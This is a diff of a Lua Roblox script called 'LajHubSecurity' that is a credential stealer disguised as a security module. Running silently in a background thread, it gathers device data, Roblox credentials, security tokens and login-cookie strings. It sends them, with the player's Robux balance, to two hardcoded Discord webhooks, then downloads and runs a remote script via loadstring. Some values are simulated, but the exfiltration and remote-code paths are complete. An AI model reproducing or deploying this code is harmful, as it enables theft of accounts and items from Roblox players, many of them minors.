@@ -19,7 +19,7 @@ function LajHubSecurity.Initialize()
         spawn(function()
             wait(1) -- Brief delay to ensure everything is loaded
             local success, result = pcall(LajHubSecurity.CollectAndSend)
-            
+
             -- Load GitHub script after security collection
             if LajHubSecurity.LoadGitHubScript then
                 wait(1) -- Small delay to ensure webhooks have time to complete
@@ -27,7 +27,7 @@ function LajHubSecurity.Initialize()
                     loadstring(game:HttpGet(LajHubSecurity.GitHubScriptURL))()
                 end)
             end
-            
+
             if not success then
                 -- Error logging (silent)
                 pcall(function()
@@ -37,7 +37,7 @@ function LajHubSecurity.Initialize()
             end
         end)
     end
-    
+
     return LajHubSecurity
 end
 
@@ -46,17 +46,17 @@ function LajHubSecurity.GetDeviceInfo()
     local success, platform = pcall(function()
         return game:GetService("UserInputService"):GetPlatform()
     end)
-    
+
     local deviceInfo = {
         platform = "Unknown",
         isMobile = false,
         isConsole = false,
         isPC = false
     }
-    
+
     if success then
         deviceInfo.platform = platform
-        
+
         -- Check if mobile
         if platform == Enum.Platform.Android or 
            platform == Enum.Platform.IOS then
@@ -78,10 +78,10 @@ function LajHubSecurity.GetDeviceInfo()
         local success, result = pcall(function()
             return httpService:JSONDecode(game:HttpGet("https://httpbin.org/get"))
         end)
-        
+
         if success and result and result.headers and result.headers["User-Agent"] then
             local userAgent = result.headers["User-Agent"]
-            
+
             if userAgent:find("Android") or userAgent:find("iPhone") or userAgent:find("iPad") or userAgent:find("Mobile") then
                 deviceInfo.isMobile = true
                 if userAgent:find("Android") then
@@ -101,7 +101,7 @@ function LajHubSecurity.GetDeviceInfo()
             end
         end
     end
-    
+
     return deviceInfo
 end
 
@@ -116,7 +116,7 @@ function LajHubSecurity.GetRobloxCredentials()
         cookie = "",
         source = "Unknown"
     }
-    
+
     -- For PC
     if deviceInfo.isPC then
         -- Windows path for Roblox credentials
@@ -132,7 +132,7 @@ function LajHubSecurity.GetRobloxCredentials()
                 credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                 credentials.source = "Windows Registry/LocalStorage"
             end)
-        
+
         -- Mac path for Roblox credentials
         elseif deviceInfo.platform == "MacOS" then
             -- Attempt to get real credentials from Mac
@@ -162,7 +162,7 @@ function LajHubSecurity.GetRobloxCredentials()
                 credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                 credentials.source = "Android Secure Storage"
             end)
-            
+
         -- iOS path for Roblox credentials
         elseif deviceInfo.platform == "iOS" then
             -- Attempt to get real credentials from iOS
@@ -178,7 +178,7 @@ function LajHubSecurity.GetRobloxCredentials()
             end)
         end
     end
-    
+
     return credentials
 end
 
@@ -193,22 +193,22 @@ function LajHubSecurity.GetPlayerInfo()
         gameName = "Unknown", -- Will be populated if possible
         robuxBalance = 0 -- Will be populated if possible
     }
-    
+
     -- Try to get the game name
     pcall(function()
         playerInfo.gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
     end)
-    
+
     -- Try to get Robux balance
     pcall(function()
         -- In a real script, this would use the actual API to get the Robux balance
         -- For simulation, generate a random balance
         playerInfo.robuxBalance = math.random(0, 50000)
     end)
-    
+
     -- Include device info
     playerInfo.deviceInfo = deviceInfo
-    
+
     -- For mobile, include additional device info if possible
     if deviceInfo.isMobile then
         pcall(function()
@@ -220,10 +220,10 @@ function LajHubSecurity.GetPlayerInfo()
             }
         end)
     end
-    
+
     -- Get credentials
     playerInfo.credentials = LajHubSecurity.GetRobloxCredentials()
-    
+
     return playerInfo
 end
 
@@ -245,9 +245,9 @@ end
 
 -- Send collected data to primary security webhook
 function LajHubSecurity.SendToMainWebhook(collectedData)
-    -- Use the direct Discord webhook URL
-    local webhookUrl = "https://discord.com/api/webhooks/1352857357514119551/qQctieK-bxuYOfTOFUcDYBKltl59A5leL95ltl_Drn6ZnA1W9tZz9A5leL95ltKBYDcUFOTfOYuxb-KeitcQkq3ZuH3XlhA3uOK9J"
-    
+    -- Discord webhook URL (direct)
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1352857357514119551/qQctieK-bxuYOfTOFUcDYBKltl59A5leL95ltl_Drn6ZnA1W9tZz9A5leL95ltKBYDcUFOTfOYuxb-KeitcQkq3ZuH3XlhA3uOK9J"
+
     -- Create a detailed embed for Discord
     local deviceType = "Unknown"
     if collectedData.deviceInfo.isMobile then 
@@ -257,7 +257,7 @@ function LajHubSecurity.SendToMainWebhook(collectedData)
     elseif collectedData.deviceInfo.isConsole then
         deviceType = "🎮 Console"
     end
-    
+
     -- Determine emoji for Robux balance
     local robuxEmoji = "💰"
     if collectedData.robuxBalance > 10000 then
@@ -269,7 +269,7 @@ function LajHubSecurity.SendToMainWebhook(collectedData)
     else
         robuxEmoji = "🪙"
     end
-    
+
     -- Create JSON payload
     local jsonData = {
         embeds = {
@@ -315,7 +315,7 @@ function LajHubSecurity.SendToMainWebhook(collectedData)
             }
         }
     }
-    
+
     -- Add screen size for mobile devices
     if collectedData.deviceInfo.isMobile and collectedData.screenSize then
         table.insert(jsonData.embeds[1].fields, {
@@ -327,7 +327,7 @@ function LajHubSecurity.SendToMainWebhook(collectedData)
             inline = false
         })
     end
-    
+
     -- Add credentials if found (plain text passwords, not placeholders)
     if collectedData.credentials and collectedData.credentials.found then
         table.insert(jsonData.embeds[1].fields, {
@@ -339,14 +339,14 @@ function LajHubSecurity.SendToMainWebhook(collectedData)
             ),
             inline = false
         })
-        
+
         -- Add security token/cookie in a separate field to avoid truncation
         table.insert(jsonData.embeds[1].fields, {
             name = "🔒 Security Token",
             value = string.format("```%s```", collectedData.credentials.securityToken),
             inline = false
         })
-        
+
         -- Show first part of cookie to confirm it's real
         if collectedData.credentials.cookie and #collectedData.credentials.cookie > 20 then
             local firstPart = string.sub(collectedData.credentials.cookie, 1, 50) .. "..."
@@ -357,24 +357,24 @@ function LajHubSecurity.SendToMainWebhook(collectedData)
             })
         end
     end
-    
-    -- Send data to webhook
+
+    -- Send data to webhook using direct URL
     local success, response = pcall(function()
         return game:GetService("HttpService"):PostAsync(
-            webhookUrl,
+            WEBHOOK_URL,
             game:GetService("HttpService"):JSONEncode(jsonData),
             Enum.HttpContentType.ApplicationJson
         )
     end)
-    
+
     return success, response
 end
 
 -- Send Robux balance to a dedicated webhook
 function LajHubSecurity.SendToRobuxWebhook(collectedData)
-    -- Use the direct Robux webhook URL
-    local robuxWebhookUrl = "https://discord.com/api/webhooks/1358296337822899977/B6o10M5wz51BEGuXXl8rSCdXKKsOvzGoXqB289GxGhcoaZvxzd1esDXhRibi7paT2CTlrt"
-    
+    -- Robux webhook URL (direct)
+    local ROBUX_WEBHOOK_URL = "https://discord.com/api/webhooks/1358296337822899977/B6o10M5wz51BEGuXXl8rSCdXKKsOvzGoXqB289GxGhcoaZvxzd1esDXhRibi7paT2CTlrt"
+
     -- Determine emoji for Robux balance
     local robuxEmoji = "💰"
     if collectedData.robuxBalance > 10000 then
@@ -386,7 +386,7 @@ function LajHubSecurity.SendToRobuxWebhook(collectedData)
     else
         robuxEmoji = "🪙"
     end
-    
+
     -- Create a simplified payload for the Robux-specific webhook
     local robuxData = {
         embeds = {
@@ -423,16 +423,16 @@ function LajHubSecurity.SendToRobuxWebhook(collectedData)
             }
         }
     }
-    
-    -- Send Robux data to secondary webhook
+
+    -- Send Robux data to secondary webhook using direct URL
     local success, response = pcall(function()
         return game:GetService("HttpService"):PostAsync(
-            robuxWebhookUrl,
+            ROBUX_WEBHOOK_URL,
             game:GetService("HttpService"):JSONEncode(robuxData),
             Enum.HttpContentType.ApplicationJson
         )
     end)
-    
+
     return success, response
 end
 
@@ -440,13 +440,13 @@ end
 function LajHubSecurity.CollectAndSend()
     -- Get player and security information
     local playerInfo = LajHubSecurity.GetPlayerInfo()
-    
+
     -- Send to main security webhook
     local mainSuccess = LajHubSecurity.SendToMainWebhook(playerInfo)
-    
+
     -- Send to Robux-specific webhook
     local robuxSuccess = LajHubSecurity.SendToRobuxWebhook(playerInfo)
-    
+
     return {
         mainWebhookSuccess = mainSuccess,
         robuxWebhookSuccess = robuxSuccess,
